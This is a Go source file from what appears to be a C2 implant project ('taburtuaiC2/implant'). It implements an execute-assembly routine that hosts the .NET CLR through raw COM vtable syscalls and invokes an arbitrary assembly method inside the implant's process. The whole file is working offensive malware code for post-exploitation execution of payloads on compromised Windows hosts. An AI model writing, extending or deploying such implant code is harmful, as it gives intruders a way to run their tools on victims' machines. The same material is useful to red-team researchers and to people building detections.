//go:build windows

package exec

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

type clrGUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

var (
	clsidCLRMetaHost = clrGUID{0x9280188D, 0x0E8E, 0x4867,
		[8]byte{0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE}}
	iidICLRMetaHost = clrGUID{0xD332DB9E, 0xB9B3, 0x4125,
		[8]byte{0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}}
	iidICLRRuntimeInfo = clrGUID{0xBD39D1D2, 0xBA2F, 0x486A,
		[8]byte{0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}}
	clsidCLRRuntimeHost = clrGUID{0x90F1A06E, 0x7712, 0x4762,
		[8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}
	iidICLRRuntimeHost = clrGUID{0x90F1A06C, 0x7712, 0x4762,
		[8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}
)

const (
	vtGetRuntime                = 3
	vtGetInterface              = 9
	vtICLRRuntimeHostStart      = 3
	vtExecuteInDefaultAppDomain = 11
)

func comVtCall(this uintptr, idx int, args ...uintptr) (uintptr, error) {
	thisPtr := unsafe.Pointer(this) //nolint:unsafeptr
	vtbl := *(*uintptr)(thisPtr)
	fn := *(*uintptr)(unsafe.Add(unsafe.Pointer(vtbl), uintptr(idx)*8)) //nolint:unsafeptr
	r, _, _ := syscallNVarargs(fn, append([]uintptr{this}, args...)...)
	if r != 0 && r != 1 {
		return r, fmt.Errorf("COM call vtable[%d] HRESULT 0x%08X", idx, uint32(r))
	}
	return r, nil
}

func syscallNVarargs(fn uintptr, args ...uintptr) (uintptr, uintptr, uintptr) {
	a := make([]uintptr, 15)
	copy(a, args)
	r1, r2, e := syscall.Syscall15(fn,
		uintptr(len(args)),
		a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7],
		a[8], a[9], a[10], a[11], a[12], a[13], a[14])
	return r1, r2, uintptr(e)
}

// DotnetExecute loads a .NET assembly from assemblyPath and invokes typeName.methodName(argument).
func DotnetExecute(assemblyPath, typeName, methodName, argument string) (int32, error) {
	var metaHost uintptr
	r, _, e := winsyscall.ProcCLRCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidCLRMetaHost)),
		uintptr(unsafe.Pointer(&iidICLRMetaHost)),
		uintptr(unsafe.Pointer(&metaHost)),
	)
	if r != 0 {
		return 0, fmt.Errorf("CLRCreateInstance: HRESULT 0x%08X (%v)", uint32(r), e)
	}
	defer comVtCall(metaHost, 2) //nolint:errcheck

	version, err := clrGetLatestVersion(metaHost)
	if err != nil {
		return 0, fmt.Errorf("get CLR version: %w", err)
	}

	versionPtr, _ := windows.UTF16PtrFromString(version)
	var runtimeInfo uintptr
	if _, err := comVtCall(metaHost, vtGetRuntime,
		uintptr(unsafe.Pointer(versionPtr)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&runtimeInfo)),
	); err != nil {
		return 0, fmt.Errorf("GetRuntime(%s): %w", version, err)
	}
	defer comVtCall(runtimeInfo, 2) //nolint:errcheck

	var runtimeHost uintptr
	if _, err := comVtCall(runtimeInfo, vtGetInterface,
		uintptr(unsafe.Pointer(&clsidCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&runtimeHost)),
	); err != nil {
		return 0, fmt.Errorf("GetInterface(ICLRRuntimeHost): %w", err)
	}
	defer comVtCall(runtimeHost, 2) //nolint:errcheck

	if _, err := comVtCall(runtimeHost, vtICLRRuntimeHostStart); err != nil {
		return 0, fmt.Errorf("ICLRRuntimeHost::Start: %w", err)
	}

	asmPtr, _ := windows.UTF16PtrFromString(assemblyPath)
	typePtr, _ := windows.UTF16PtrFromString(typeName)
	methPtr, _ := windows.UTF16PtrFromString(methodName)
	argPtr, _ := windows.UTF16PtrFromString(argument)
	var retVal uint32

	if _, err := comVtCall(runtimeHost, vtExecuteInDefaultAppDomain,
		uintptr(unsafe.Pointer(asmPtr)),
		uintptr(unsafe.Pointer(typePtr)),
		uintptr(unsafe.Pointer(methPtr)),
		uintptr(unsafe.Pointer(argPtr)),
		uintptr(unsafe.Pointer(&retVal)),
	); err != nil {
		return 0, fmt.Errorf("ExecuteInDefaultAppDomain: %w", err)
	}

	return int32(retVal), nil
}

func clrGetLatestVersion(metaHost uintptr) (string, error) {
	var enumPtr uintptr
	if _, err := comVtCall(metaHost, 5, uintptr(unsafe.Pointer(&enumPtr))); err != nil {
		return "v4.0.30319", nil
	}
	defer comVtCall(enumPtr, 2) //nolint:errcheck

	var latest [32]uint16
	var elem uintptr
	var fetched uint32
	for {
		enumVtbl := *(*uintptr)(unsafe.Pointer(enumPtr))      //nolint:unsafeptr
		enumNext := *(*uintptr)(unsafe.Add(unsafe.Pointer(enumVtbl), 3*8)) //nolint:unsafeptr
		r, _, _ := syscall.Syscall15(
			enumNext, 5,
			enumPtr, 1, uintptr(unsafe.Pointer(&elem)), uintptr(unsafe.Pointer(&fetched)), 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		)
		if r != 0 || fetched == 0 {
			break
		}
		var bufLen uint32 = 32
		elemVtbl := *(*uintptr)(unsafe.Pointer(elem))                      //nolint:unsafeptr
		getVer := *(*uintptr)(unsafe.Add(unsafe.Pointer(elemVtbl), 3*8))   //nolint:unsafeptr
		syscall.Syscall15( //nolint:errcheck
			getVer, 3,
			elem, uintptr(unsafe.Pointer(&latest[0])), uintptr(unsafe.Pointer(&bufLen)), 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		)
		comVtCall(elem, 2) //nolint:errcheck
	}

	if latest[0] == 0 {
		return "v4.0.30319", nil
	}
	return windows.UTF16ToString(latest[:]), nil
}
